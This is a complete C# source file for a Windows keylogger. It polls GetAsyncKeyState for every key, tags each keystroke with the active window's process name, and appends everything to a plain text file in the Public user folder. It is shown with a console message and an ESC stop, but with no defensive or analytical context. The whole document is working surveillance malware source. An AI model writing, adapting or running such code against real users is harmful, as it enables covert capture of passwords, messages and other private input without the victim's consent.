using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Threading;

class Keylogger
{
    // import api functions
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")]
    public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder text, int count);
    [DllImport("user32.dll")]
    public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);

    static void Main()
    {
        string logFilePath = "C:\\Users\\Public\\keylog.txt";  // save logs
        Console.WriteLine("Started... Press ESC to stop.\n");

        string lastWindow = "";
        while (true)
        {
            Thread.Sleep(5);  // prevent excessive CPU usage

            IntPtr activeWindow = GetForegroundWindow();
            string currentWindow = GetActiveWindowProcess(activeWindow);

            // log new active window
            if (currentWindow != lastWindow)
            {
                lastWindow = currentWindow;
                Console.WriteLine("\n[Active Window] " + currentWindow);
                File.AppendAllText(logFilePath, "\n[Active Window] " + currentWindow + "\n");
            }

            // capture strokes
            for (int key = 1; key < 255; key++)
            {
                int keyState = GetAsyncKeyState(key);
                if (keyState == -32767)
                {
                    string keyLog = ((Keys)key).ToString();
                    Console.Write(keyLog + " ");
                    File.AppendAllText(logFilePath, keyLog + " ");

                    // stop with ESC
                    if ((Keys)key == Keys.Escape)
                    {
                        Console.WriteLine("\n[INFO] Stopped.");
                        return;
                    }
                }
            }
        }
    }

    // get currently active program
    static string GetActiveWindowProcess(IntPtr hwnd)
    {
        uint processId;
        GetWindowThreadProcessId(hwnd, out processId);

        try
        {
            Process process = Process.GetProcessById((int)processId);
            return process.ProcessName + "(" + processId + ")";
        }
        catch
        {
            return "Unknown Process";
        }
    }
}
